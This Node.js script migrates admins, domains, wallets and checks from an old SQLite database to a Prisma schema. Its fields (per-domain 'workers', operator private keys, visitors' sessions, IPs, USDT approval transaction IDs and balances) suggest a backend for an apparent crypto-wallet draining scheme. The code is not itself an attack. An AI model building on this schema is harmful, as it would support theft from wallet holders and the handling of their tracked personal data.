#!/usr/bin/env node

/**
 * Независимый скрипт для переноса данных из старой SQLite базы (database.sqlite)
 * в новую SQLite базу (database.db) с новой схемой Prisma
 * 
 * Использование:
 * 1. Установите зависимости: npm install sqlite3
 * 2. Поместите файлы database.sqlite и database.db в ту же папку что и скрипт
 * 3. Запустите: node migrate-data.js
 */

const sqlite3 = require('sqlite3').verbose();
const fs = require('fs');
const path = require('path');

// Пути к базам данных
const OLD_DB_PATH = './database.sqlite';
const NEW_DB_PATH = './database.db';

class DataMigrator {
    constructor() {
        this.oldDb = null;
        this.newDb = null;
        this.stats = {
            admin: { processed: 0, success: 0, errors: 0 },
            domain: { processed: 0, success: 0, errors: 0 },
            wallet: { processed: 0, success: 0, errors: 0 },
            check: { processed: 0, success: 0, errors: 0 }
        };
    }

    async connect() {
        console.log('🔗 Подключение к базам данных...');
        
        // Проверяем существование файлов
        if (!fs.existsSync(OLD_DB_PATH)) {
            throw new Error(`Старая база данных не найдена: ${OLD_DB_PATH}`);
        }
        
        if (!fs.existsSync(NEW_DB_PATH)) {
            throw new Error(`Новая база данных не найдена: ${NEW_DB_PATH}`);
        }

        return new Promise((resolve, reject) => {
            this.oldDb = new sqlite3.Database(OLD_DB_PATH, sqlite3.OPEN_READONLY, (err) => {
                if (err) {
                    reject(new Error(`Ошибка подключения к старой БД: ${err.message}`));
                    return;
                }
                console.log('✅ Подключено к старой базе данных');
                
                this.newDb = new sqlite3.Database(NEW_DB_PATH, sqlite3.OPEN_READWRITE, (err) => {
                    if (err) {
                        reject(new Error(`Ошибка подключения к новой БД: ${err.message}`));
                        return;
                    }
                    console.log('✅ Подключено к новой базе данных');
                    resolve();
                });
            });
        });
    }

    async disconnect() {
        console.log('🔌 Закрытие подключений к базам данных...');
        
        if (this.oldDb) {
            await new Promise((resolve) => {
                this.oldDb.close((err) => {
                    if (err) console.error('Ошибка закрытия старой БД:', err.message);
                    resolve();
                });
            });
        }
        
        if (this.newDb) {
            await new Promise((resolve) => {
                this.newDb.close((err) => {
                    if (err) console.error('Ошибка закрытия новой БД:', err.message);
                    resolve();
                });
            });
        }
    }

    async queryOldDb(sql, params = []) {
        return new Promise((resolve, reject) => {
            this.oldDb.all(sql, params, (err, rows) => {
                if (err) {
                    reject(err);
                } else {
                    resolve(rows);
                }
            });
        });
    }

    async runNewDb(sql, params = []) {
        return new Promise((resolve, reject) => {
            this.newDb.run(sql, params, function(err) {
                if (err) {
                    reject(err);
                } else {
                    resolve({ id: this.lastID, changes: this.changes });
                }
            });
        });
    }

    async migrateAdmins() {
        console.log('\n👤 Миграция администраторов...');
        
        try {
            const admins = await this.queryOldDb('SELECT * FROM admins');
            console.log(`📊 Найдено ${admins.length} администраторов в старой БД`);
            
            for (const admin of admins) {
                this.stats.admin.processed++;
                
                try {
                    await this.runNewDb(`
                        INSERT OR REPLACE INTO Admin (id, username, password, created_at, last_login, updated_at)
                        VALUES (?, ?, ?, ?, ?, ?)
                    `, [
                        admin.id,
                        admin.username,
                        admin.password,
                        admin.created_at || new Date().toISOString(),
                        admin.last_login,
                        admin.updated_at || new Date().toISOString()
                    ]);
                    
                    this.stats.admin.success++;
                    console.log(`✅ Администратор ${admin.username} перенесен`);
                } catch (error) {
                    this.stats.admin.errors++;
                    console.error(`❌ Ошибка переноса администратора ${admin.username}:`, error.message);
                }
            }
        } catch (error) {
            console.error('❌ Ошибка получения администраторов из старой БД:', error.message);
        }
    }

    async migrateDomains() {
        console.log('\n🌐 Миграция доменов...');
        
        try {
            const domains = await this.queryOldDb('SELECT * FROM domains');
            console.log(`📊 Найдено ${domains.length} доменов в старой БД`);
            
            for (const domain of domains) {
                this.stats.domain.processed++;
                
                try {
                    // Обрабатываем JSON поля
                    let chats = '[]';
                    let metadata = '{}';
                    let append_transaction_data = '{}';
                    
                    try {
                        if (domain.chats) {
                            if (typeof domain.chats === 'string') {
                                chats = domain.chats;
                            } else {
                                chats = JSON.stringify(domain.chats);
                            }
                        }
                    } catch (e) {
                        console.warn(`⚠️  Ошибка обработки chats для домена ${domain.domain}:`, e.message);
                    }
                    
                    try {
                        if (domain.metadata) {
                            if (typeof domain.metadata === 'string') {
                                metadata = domain.metadata;
                            } else {
                                metadata = JSON.stringify(domain.metadata);
                            }
                        }
                    } catch (e) {
                        console.warn(`⚠️  Ошибка обработки metadata для домена ${domain.domain}:`, e.message);
                    }
                    
                    try {
                        if (domain.append_transaction_data) {
                            if (typeof domain.append_transaction_data === 'string') {
                                append_transaction_data = domain.append_transaction_data;
                            } else {
                                append_transaction_data = JSON.stringify(domain.append_transaction_data);
                            }
                        }
                    } catch (e) {
                        console.warn(`⚠️  Ошибка обработки append_transaction_data для домена ${domain.domain}:`, e.message);
                    }

                    await this.runNewDb(`
                        INSERT OR REPLACE INTO Domain (
                            id, worker_id, worker_nickname, domain, chats, metadata,
                            low_balance_every_10_min, low_balance_text, append_transaction_data,
                            operator_wallet_address, operator_wallet_privateKey, only_contract,
                            minimal_asset_amount, created_at, updated_at
                        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    `, [
                        domain.id,
                        domain.worker_id || '',
                        domain.worker_nickname || '',
                        domain.domain || '',
                        chats,
                        metadata,
                        domain.low_balance_every_10_min,
                        domain.low_balance_text,
                        append_transaction_data,
                        domain.operator_wallet_address,
                        domain.operator_wallet_privateKey,
                        domain.only_contract ? 1 : 0,
                        domain.minimal_asset_amount || 10,
                        domain.created_at || new Date().toISOString(),
                        domain.updated_at || new Date().toISOString()
                    ]);
                    
                    this.stats.domain.success++;
                    console.log(`✅ Домен ${domain.domain} перенесен`);
                } catch (error) {
                    this.stats.domain.errors++;
                    console.error(`❌ Ошибка переноса домена ${domain.domain}:`, error.message);
                }
            }
        } catch (error) {
            console.error('❌ Ошибка получения доменов из старой БД:', error.message);
        }
    }

    async migrateWallets() {
        console.log('\n💳 Миграция кошельков...');
        
        try {
            const wallets = await this.queryOldDb('SELECT * FROM wallets');
            console.log(`📊 Найдено ${wallets.length} кошельков в старой БД`);
            
            for (const wallet of wallets) {
                this.stats.wallet.processed++;
                
                try {
                    await this.runNewDb(`
                        INSERT OR REPLACE INTO Wallet (
                            id, address, walletType, sessionId, session, userAgent, ipAddress, hostname, country,
                            metadata, has_usdt_approval, usdt_approval_txid, usdt_approval_date,
                            trxBalance, usdtBalance, lastBalanceUpdate, created_at, updated_at
                        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    `, [
                        wallet.id,
                        wallet.address || '',
                        wallet.walletType || wallet.wallet_type || '',
                        wallet.sessionId || wallet.session_id || '',
                        wallet.session || null,
                        wallet.userAgent || wallet.user_agent || '',
                        wallet.ipAddress || wallet.ip_address || '',
                        wallet.hostname || '',
                        wallet.country || '',
                        wallet.metadata || '',
                        wallet.has_usdt_approval ? 1 : 0,
                        wallet.usdt_approval_txid || '',
                        wallet.usdt_approval_date,
                        parseFloat(wallet.trxBalance || wallet.trx_balance || 0),
                        parseFloat(wallet.usdtBalance || wallet.usdt_balance || 0),
                        wallet.lastBalanceUpdate || wallet.last_balance_update,
                        wallet.created_at || new Date().toISOString(),
                        wallet.updated_at || new Date().toISOString()
                    ]);
                    
                    this.stats.wallet.success++;
                    console.log(`✅ Кошелек ${wallet.address} перенесен`);
                } catch (error) {
                    this.stats.wallet.errors++;
                    console.error(`❌ Ошибка переноса кошелька ${wallet.address}:`, error.message);
                }
            }
        } catch (error) {
            console.error('❌ Ошибка получения кошельков из старой БД:', error.message);
        }
    }

    async migrateChecks() {
        console.log('\n🧾 Миграция чеков...');
        
        try {
            const checks = await this.queryOldDb('SELECT * FROM checks');
            console.log(`📊 Найдено ${checks.length} чеков в старой БД`);
            
            for (const check of checks) {
                this.stats.check.processed++;
                
                try {
                    await this.runNewDb(`
                        INSERT OR REPLACE INTO "Check" (
                            id, wallet_address, amount, check_data, raw_check, timer_start, timer_end,
                            status, hostname, ip_address, user_agent, created_at, updated_at
                        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    `, [
                        check.id,
                        check.wallet_address || '',
                        parseFloat(check.amount || 0),
                        check.check_data,
                        check.raw_check,
                        check.timer_start || new Date().toISOString(),
                        check.timer_end || new Date().toISOString(),
                        check.status || 'active',
                        check.hostname,
                        check.ip_address,
                        check.user_agent,
                        check.created_at || new Date().toISOString(),
                        check.updated_at || new Date().toISOString()
                    ]);
                    
                    this.stats.check.success++;
                    console.log(`✅ Чек для ${check.wallet_address} (${check.amount}) перенесен`);
                } catch (error) {
                    this.stats.check.errors++;
                    console.error(`❌ Ошибка переноса чека ${check.id}:`, error.message);
                }
            }
        } catch (error) {
            console.error('❌ Ошибка получения чеков из старой БД:', error.message);
        }
    }

    printStats() {
        console.log('\n📈 СТАТИСТИКА МИГРАЦИИ:');
        console.log('=' * 50);
        
        Object.entries(this.stats).forEach(([table, stats]) => {
            console.log(`\n${table.toUpperCase()}:`);
            console.log(`  📝 Обработано: ${stats.processed}`);
            console.log(`  ✅ Успешно: ${stats.success}`);
            console.log(`  ❌ Ошибок: ${stats.errors}`);
            
            if (stats.processed > 0) {
                const successRate = ((stats.success / stats.processed) * 100).toFixed(1);
                console.log(`  📊 Успешность: ${successRate}%`);
            }
        });
        
        const totalProcessed = Object.values(this.stats).reduce((sum, s) => sum + s.processed, 0);
        const totalSuccess = Object.values(this.stats).reduce((sum, s) => sum + s.success, 0);
        const totalErrors = Object.values(this.stats).reduce((sum, s) => sum + s.errors, 0);
        
        console.log('\n📊 ОБЩАЯ СТАТИСТИКА:');
        console.log(`  📝 Всего записей: ${totalProcessed}`);
        console.log(`  ✅ Перенесено успешно: ${totalSuccess}`);
        console.log(`  ❌ Ошибок: ${totalErrors}`);
        
        if (totalProcessed > 0) {
            const overallSuccessRate = ((totalSuccess / totalProcessed) * 100).toFixed(1);
            console.log(`  📊 Общая успешность: ${overallSuccessRate}%`);
        }
    }

    async migrate() {
        try {
            console.log('🚀 Начало миграции данных из старой SQLite базы в новую...\n');
            
            await this.connect();
            
            // Выполняем миграцию таблиц по порядку
            await this.migrateAdmins();
            await this.migrateDomains();
            await this.migrateWallets();
            await this.migrateChecks();
            
            this.printStats();
            
            console.log('\n🎉 Миграция завершена!');
            
        } catch (error) {
            console.error('\n💥 Критическая ошибка миграции:', error.message);
            throw error;
        } finally {
            await this.disconnect();
        }
    }
}

// Проверяем аргументы командной строки
function parseArgs() {
    const args = process.argv.slice(2);
    const options = {
        help: false,
        force: false
    };
    
    for (const arg of args) {
        switch (arg) {
            case '--help':
            case '-h':
                options.help = true;
                break;
            case '--force':
            case '-f':
                options.force = true;
                break;
        }
    }
    
    return options;
}

function printHelp() {
    console.log(`
📚 СКРИПТ МИГРАЦИИ ДАННЫХ

Использование: node migrate-data.js [опции]

Опции:
  -h, --help     Показать эту справку
  -f, --force    Принудительно перезаписать данные в новой БД

Описание:
  Скрипт переносит данные из старой SQLite базы (database.sqlite)
  в новую SQLite базу (database.db) с новой схемой Prisma.

Требования:
  1. Файл database.sqlite должен существовать в той же папке
  2. Файл database.db должен существовать и содержать схему Prisma
  3. Установленная зависимость: npm install sqlite3

Таблицы для миграции:
  - admins → Admin
  - domains → Domain  
  - wallets → Wallet
  - checks → Check
`);
}

// Основная функция
async function main() {
    const options = parseArgs();
    
    if (options.help) {
        printHelp();
        return;
    }
    
    console.log('🔄 МИГРАЦИЯ ДАННЫХ ИЗ СТАРОЙ SQLITE БАЗЫ В НОВУЮ');
    console.log('================================================\n');
    
    if (!options.force) {
        console.log('⚠️  ВНИМАНИЕ: Данные в новой базе могут быть перезаписаны!');
        console.log('💡 Используйте --force для пропуска этого предупреждения\n');
        
        // В реальном скрипте здесь можно добавить интерактивное подтверждение
        // Для автоматизации пропускаем
    }
    
    const migrator = new DataMigrator();
    
    try {
        await migrator.migrate();
        process.exit(0);
    } catch (error) {
        console.error('\n💥 Миграция не удалась:', error.message);
        process.exit(1);
    }
}

// Запуск скрипта
if (require.main === module) {
    main().catch(error => {
        console.error('Необработанная ошибка:', error);
        process.exit(1);
    });
}

module.exports = { DataMigrator };
